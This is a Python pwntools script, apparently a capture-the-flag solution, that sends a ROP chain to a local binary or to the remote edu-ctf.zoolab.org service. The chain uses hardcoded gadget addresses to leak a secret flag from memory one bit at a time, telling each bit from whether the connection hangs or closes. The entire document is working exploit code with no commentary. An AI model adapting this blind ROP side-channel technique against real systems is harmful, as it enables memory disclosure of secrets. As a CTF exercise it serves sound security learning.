from pwn import *

context.arch = 'amd64'
context.timeout = 0.5

flag_addr = 0x4de2e0

pop_rax = 0x458237 # pop rax ; ret
movzx_eax_rax = 0x4282f3 # movzx eax, byte ptr [rax] ; ret
push_rdi = 0x43a93e # push rdi ; ret
pop_rdi = 0x401812 # pop rdi ; ret
pop_rsi = 0x402798 # pop rsi ; ret
and_cmp_jne = 0x48715a # and eax, esi ; cmp rdi, rax ; jne 0x487168 ; pop rbx ; ret

def get_a_bit(byte_offset, bit_offset, local):
    if local == 1:
        target = process('share/chal')
        # gdb.attach(target)
    else:
        target = remote('edu-ctf.zoolab.org', 10012)
    
    payload = flat(
        0, 0,
        0, 0,
        0,
        pop_rax, flag_addr + byte_offset,
        movzx_eax_rax,
        pop_rsi, 2**bit_offset,
        pop_rdi, 0,
        and_cmp_jne, 0,
        pop_rdi, 0x43a93e,
        push_rdi,
    )
    target.sendafter(b'talk is cheap, show me the rop\n', payload)
    try:
        target.recv(1)
        print('the bit is 0')
        return 0
    except:
        print('the bit is 1')
        return 1
    target.close()

def get_a_byte(byte_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(get_a_bit(byte_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

local = 0
flag = ''
for i in range(0x30):
    byte = get_a_byte(i, local)
    flag += chr(byte)
print(flag)